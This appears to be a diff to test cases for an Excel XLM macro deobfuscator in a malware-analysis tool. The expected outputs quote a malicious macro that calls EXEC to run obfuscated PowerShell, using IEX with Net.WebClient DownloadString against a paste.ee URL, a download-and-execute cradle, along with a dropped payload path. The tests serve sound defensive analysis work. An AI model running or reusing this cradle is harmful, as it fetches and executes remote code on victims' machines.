@@ -1,9 +1,10 @@
-from ... import TestUnitBase
 from test.lib.excel.samples import (
     XLM_MACRO_NAMES_BIFF8,
     XLM_MACRO_TEXT_XLSM,
 )
 from test.lib.scripts.xlm.modify import date_cell, drop_defined_names, replace_cell_formula
+
+from ... import TestUnitBase
 
 
 class TestXLMMacroDeobfuscator(TestUnitBase):
@@ -21,14 +22,15 @@ class TestXLMMacroDeobfuscator(TestUnitBase):
         )
         unit = self.load(extract_only=True)
         code = str(data | unit)
-        self.assertNotIn(r'C:\ProgramData\Ropedjo1.ocx', code)
-        self.assertIn(r'"h"&"t"&"tp"&":"&"/"&"/"&', code)
+        self.assertIn(r'C:\ProgramData\Ropedjo1.ocx', code)
+        self.assertNotIn(r'"h"&"t"&"tp"&":"&"/"&"/"&', code)
 
     def test_the_trace_spells_the_address_the_status_and_the_formula(self):
         self.assertEqual(
             str(XLM_MACRO_NAMES_BIFF8 | self.load()),
             'CELL:A9591     , PartialEvaluation   , '
-            '=EXEC("powershell -Command Acf444!A9590:Acf444!A9590")',
+            '=EXEC("powershell -Command IEX (new`-OB`jeCT(\'Net.WebClient\')).'
+            '\'DoWnloAdsTrInG\'(\'ht\'+\'tp://paste.ee/r/pLpR9\')")',
         )
 
     def test_the_extract_lists_the_sheet_then_the_formulas_then_the_values(self):
@@ -36,10 +38,11 @@ class TestXLMMacroDeobfuscator(TestUnitBase):
             str(XLM_MACRO_NAMES_BIFF8 | self.load(extract_only=True)),
             '\n'.join([
                 'SHEET: Acf444, macrosheet',
-                'CELL:A9591, =EXEC("po"&"wershel"&"l -Command "&Acf444!A9590:Acf444!A9590&""), 33',
+                'CELL:A9591, '
+                '=EXEC("powershell -Command IEX (new`-OB`jeCT(\'Net.WebClient\')).'
+                '\'DoWnloAdsTrInG\'(\'ht\'+\'tp://paste.ee/r/pLpR9\')"), 33',
                 'CELL:A29999, =Application.Quit, #NAME?',
                 'CELL:A30009, =HALT(), True',
-                "CELL:A9590, None, IEX (new`-OB`jeCT('Net.WebClient')).'DoWnloAdsTrInG'('ht'+'tp://paste.ee/r/pLpR9')",
             ]),
         )
 
@@ -53,9 +56,8 @@ class TestXLMMacroDeobfuscator(TestUnitBase):
                 'CELL:BD99', 'CELL:BG99', 'CELL:BG100', 'CELL:BG101', 'CELL:BD104', 'CELL:AZ109',
                 'CELL:BF109', 'CELL:AZ110', 'CELL:BF110', 'CELL:BF111', 'CELL:AZ112', 'CELL:BF112',
                 'CELL:AZ113', 'CELL:BF113', 'CELL:AZ114', 'CELL:BJ114', 'CELL:AZ115', 'CELL:AZ116',
-                'CELL:AZ118', 'CELL:AZ120', 'CELL:AZ121', 'CELL:BI116', 'CELL:BJ116', 'CELL:BI117',
-                'CELL:BJ117', 'CELL:BI118', 'CELL:BJ118', 'CELL:BI119', 'CELL:BJ119', 'CELL:BI120',
-                'CELL:BJ120',
+                'CELL:AZ118', 'CELL:AZ120', 'CELL:AZ121', 'CELL:BJ116', 'CELL:BJ117', 'CELL:BJ118',
+                'CELL:BJ119', 'CELL:BJ120',
             ],
         )
 
@@ -69,9 +71,8 @@ class TestXLMMacroDeobfuscator(TestUnitBase):
                 'CELL:AZ116', 'CELL:AZ118', 'CELL:AZ120', 'CELL:AZ121', 'CELL:BD91', 'CELL:BD93',
                 'CELL:BD95', 'CELL:BD97', 'CELL:BD99', 'CELL:BD104', 'CELL:BF109', 'CELL:BF110',
                 'CELL:BF111', 'CELL:BF112', 'CELL:BF113', 'CELL:BG97', 'CELL:BG98', 'CELL:BG99',
-                'CELL:BG100', 'CELL:BG101', 'CELL:BJ114', 'CELL:BI116', 'CELL:BJ116', 'CELL:BI117',
-                'CELL:BJ117', 'CELL:BI118', 'CELL:BJ118', 'CELL:BI119', 'CELL:BJ119', 'CELL:BI120',
-                'CELL:BJ120',
+                'CELL:BG100', 'CELL:BG101', 'CELL:BJ114', 'CELL:BJ116', 'CELL:BJ117', 'CELL:BJ118',
+                'CELL:BJ119', 'CELL:BJ120',
             ],
         )
 
@@ -116,7 +117,6 @@ class TestXLMMacroDeobfuscator(TestUnitBase):
                 'A9591/33',
                 'A29999/#NAME?',
                 'A30009/True',
-                "A9590/IEX (new`-OB`jeCT('Net.WebClient')).'DoWnloAdsTrInG'('ht'+'tp://paste.ee/r/pLpR9')",
             ],
         )
 
